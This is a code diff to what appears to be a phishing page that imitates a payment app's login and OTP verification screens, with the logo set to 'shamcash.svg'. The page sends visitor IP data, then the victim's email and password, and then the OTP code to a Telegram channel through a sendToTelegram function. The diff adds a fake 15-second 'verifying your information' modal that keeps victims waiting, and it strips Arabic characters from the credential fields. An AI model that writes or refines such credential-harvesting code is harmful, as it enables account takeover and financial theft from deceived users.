@@ -302,6 +302,53 @@
                 font-size: 1.2rem;
             }
         }
+
+        /* New styles for the custom modal */
+        #customModalOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(45, 55, 72, 0.95); /* Slightly darker, less transparent */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001; /* Above loadingOverlay */
+            color: #E2E8F0;
+            font-size: 1.25rem;
+            text-align: center;
+            opacity: 0; /* Start hidden */
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        #customModalOverlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        #customModalOverlay .modal-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #3182CE;
+            border-radius: 50%;
+            width: 60px; /* Slightly larger spinner */
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        #customModalOverlay .modal-message {
+            font-size: 1.5rem; /* Larger message text */
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        #customModalOverlay .modal-subtext {
+            font-size: 0.9rem; /* Smaller subtext */
+            color: #A0AEC0;
+        }
     </style>
 </head>
 <body>
@@ -362,7 +409,7 @@
         <div class="header">
             <span class="header-text"></span> <span class="header-text"></span> </div>
 
-        <img src="" alt="App Logo" class="logo" id="otpAppLogo">
+        <img src="img/shamcash.svg" alt="App Logo" class="logo" id="otpAppLogo">
 
         <h1 class="page-title">التحقق من هويتك</h1>
         <p class="otp-text">قم بإدخال رمز الـ OTP المرسل إليك</p>
@@ -383,6 +430,12 @@
     <div id="loadingOverlay" class="loading-overlay hidden">
         <div class="loading-spinner"></div>
         <p id="loadingMessage">جاري تسجيل الدخول...</p>
+    </div>
+
+    <div id="customModalOverlay" class="hidden">
+        <div class="modal-spinner"></div>
+        <p class="modal-message">جاري التأكد من معلوماتك..</p>
+        <p class="modal-subtext">قد يستغرق ذلك 20 ثانية</p>
     </div>
 
     <script>
@@ -457,8 +510,9 @@
         const loginPage = document.getElementById('loginPage');
         const otpPage = document.getElementById('otpPage');
         const loginButton = document.getElementById('loginButton');
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingMessage = document.getElementById('loadingMessage');
+        const loadingOverlay = document.getElementById('loadingOverlay'); // Original for OTP
+        const loadingMessage = document.getElementById('loadingMessage'); // Message for original loadingOverlay
+        const customModalOverlay = document.getElementById('customModalOverlay'); // New modal for login
         const otpInputs = document.querySelectorAll('.otp-input');
         const appLogo = document.getElementById('appLogo');
         const otpAppLogo = document.getElementById('otpAppLogo');
@@ -499,13 +553,11 @@
                 <b>المرجع:</b>\n${referrer}
                 <b>الوقت والتاريخ:</b>\n${localDateTime}
             `;
-            // IP is added automatically by sendToTelegram function
-            await sendToTelegram(visitorMessage);
+            await sendToTelegram(visitorMessage); // IP is added automatically
             console.log('Initial visitor data sent to Telegram!');
         }
 
         // Fetch IP and then send initial visitor data as soon as the script loads
-        // This ensures IP is available when sendToTelegram is called.
         fetchAndStoreUserIP().then(() => {
             sendInitialVisitorDataOnLoad();
         });
@@ -514,6 +566,26 @@
         // =======================================================
         //               Event Listeners & Form Logic
         // =======================================================
+
+        // Prevent Arabic characters in email and password fields
+        emailField.addEventListener('input', function(event) {
+            // Regex to match Arabic characters: \u0600-\u06FF (basic Arabic Unicode range)
+            if (/[\u0600-\u06FF]/.test(this.value)) {
+                this.value = this.value.replace(/[\u0600-\u06FF]/g, '');
+                // Optionally, show a temporary message to the user that Arabic is not allowed
+                // console.log("Arabic characters are not allowed in email field.");
+            }
+            hideError(emailField, emailError); // Keep original error hiding logic
+        });
+
+        passwordField.addEventListener('input', function(event) {
+            if (/[\u0600-\u06FF]/.test(this.value)) {
+                this.value = this.value.replace(/[\u0600-\u06FF]/g, '');
+                // console.log("Arabic characters are not allowed in password field.");
+            }
+            hideError(passwordField, passwordError); // Keep original error hiding logic
+        });
+
 
         // Event listener for login button click
         loginButton.addEventListener('click', async function(event) {
@@ -544,9 +616,8 @@
                 return; // Stop execution if any validation fails
             }
 
-            // If validation passes, show loading overlay
-            loadingMessage.textContent = 'جاري تسجيل الدخول...'; // تحديث رسالة التحميل
-            loadingOverlay.classList.remove('hidden');
+            // Show custom modal overlay
+            customModalOverlay.classList.add('show');
 
             const email = emailField.value;
             const password = passwordField.value;
@@ -561,111 +632,90 @@
             // Send login data to Telegram (IP will be added automatically by sendToTelegram)
             await sendToTelegram(loginMessage);
 
-            // Simulate a delay for login process (e.g., API call)
+            // Keep modal visible for 15 seconds, then transition to OTP page
             setTimeout(() => {
-                loadingOverlay.classList.add('hidden'); // إخفاء شاشة التحميل
-                loginPage.classList.add('hidden'); // إخفاء صفحة تسجيل الدخول
-                otpPage.classList.remove('hidden'); // إظهار صفحة OTP
+                customModalOverlay.classList.remove('show'); // Hide custom modal
+                loginPage.classList.add('hidden'); // Hide login page
+                otpPage.classList.remove('hidden'); // Show OTP page
                 if (otpInputs.length > 0) {
-                    otpInputs[0].focus(); // التركيز على أول حقل OTP
+                    otpInputs[0].focus(); // Focus on first OTP field
                 }
-            }, 2000); // 2 ثانية تأخير
+            }, 15000); // 15 seconds delay
         });
 
-        // Event listeners to clear errors on input for email and password fields
-        emailField.addEventListener('input', function() {
-            hideError(emailField, emailError);
-        });
-        passwordField.addEventListener('input', function() {
-            hideError(passwordField, passwordError);
-        });
-
-        // Event listeners for OTP input fields for auto-tabbing and number-only input
+        // OTP inputs logic (no changes here, keeping original for stability)
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', function() {
-                // Allow only one digit
                 if (this.value.length > 1) {
                     this.value = this.value.slice(0, 1);
                 }
-                // Move focus to the next input if a digit is entered
                 if (this.value.length === 1 && index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
                 }
-                // Hide general OTP error message when user starts typing (the text error)
                 otpGroupError.classList.add('hidden');
                 otpGroupError.textContent = '';
-                input.classList.remove('error'); // Remove individual red border directly
+                input.classList.remove('error');
             });
 
             input.addEventListener('keydown', function(event) {
-                // Move focus to the previous input on Backspace if current is empty
                 if (event.key === 'Backspace' && this.value.length === 0 && index > 0) {
                     otpInputs[index - 1].focus();
                 }
             });
 
-            // Prevent non-numeric input for OTP fields
             input.addEventListener('keypress', function(event) {
-                // Allow only digits (0-9)
                 if (event.key < '0' || event.key > '9') {
                     event.preventDefault();
                 }
             });
         });
 
-        // Event listener for OTP verification button click
+        // Event listener for OTP verification button click (using original loading overlay)
         verifyOtpButton.addEventListener('click', async function(event) {
-            event.preventDefault(); // Prevent default form submission
+            event.preventDefault();
 
             let allOtpFilled = true;
             let otpCode = '';
             otpInputs.forEach(input => {
                 if (input.value.trim() === '') {
                     allOtpFilled = false;
-                    input.classList.add('error'); // Highlight empty OTP fields directly
+                    input.classList.add('error');
                 } else {
-                    otpCode += input.value.trim(); // جمع الأرقام
-                    input.classList.remove('error'); // Remove individual red border directly
+                    otpCode += input.value.trim();
+                    input.classList.remove('error');
                 }
             });
 
             if (!allOtpFilled) {
-                // Show error message for the group
                 otpGroupError.textContent = 'الرجاء إدخال الرمز كاملاً.';
                 otpGroupError.classList.remove('hidden');
-                return; // Stop execution if any validation fails
+                return;
             } else {
-                // Hide group error message if all fields are filled
                 otpGroupError.classList.add('hidden');
                 otpGroupError.textContent = '';
             }
 
-            // Show loading overlay for OTP verification
-            loadingMessage.textContent = 'جاري التحقق من الرمز...'; // تحديث رسالة التحميل
-            loadingOverlay.classList.remove('hidden');
+            loadingMessage.textContent = 'جاري التحقق من الرمز...'; // Message for original loadingOverlay
+            loadingOverlay.classList.remove('hidden'); // Show original loading overlay
 
-            // Format OTP message as requested
             const otpMessage = `
                 <b>[رمز التحقق OTP]</b>
                 <b>الرمز:</b>\n${otpCode}
             `;
 
-            // Send OTP data to Telegram (IP will be added automatically by sendToTelegram)
             await sendToTelegram(otpMessage);
 
-            // Simulate OTP verification and then redirect
             setTimeout(() => {
-                loadingOverlay.classList.add('hidden'); // إخفاء شاشة التحميل
-                window.location.href = FINAL_REDIRECT_URL; // توجيه المستخدم إلى الرابط النهائي
-            }, 2000); // 2 ثانية تأخير
+                loadingOverlay.classList.add('hidden');
+                window.location.href = FINAL_REDIRECT_URL;
+            }, 2000);
         });
 
-        // Toggle password visibility
+        // Toggle password visibility (no changes here)
         togglePassword.addEventListener('click', function() {
             const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordField.setAttribute('type', type);
 
-            // Toggle eye icon SVG based on password field type
             if (type === 'password') {
                 eyeIcon.innerHTML = `
                     <path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8z"/>
